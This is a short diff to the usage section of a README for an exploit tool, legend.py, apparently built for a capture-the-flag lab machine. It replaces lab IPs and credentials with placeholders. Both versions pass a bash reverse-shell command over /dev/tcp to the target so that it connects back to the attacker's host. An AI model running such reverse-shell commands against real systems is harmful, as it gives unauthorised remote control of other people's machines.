@@ -15,5 +15,5 @@ pip3 install --upgrade git+https://github.com/arthaud/python3-pwntools.git
 ```
 
 ```sh
-./legend.py -r 10.10.10.66 -p 2222 -u ftpuser -P "@whereyougo?" -c "/bin/bash -pi >& /dev/tcp/10.10.15.59/443 0>&1"
+./legend.py -r 1.1.1.1 -p 22 -u user -P pass -c "/bin/bash -pi >& /dev/tcp/2.2.2.2/443 0>&1"
 ```
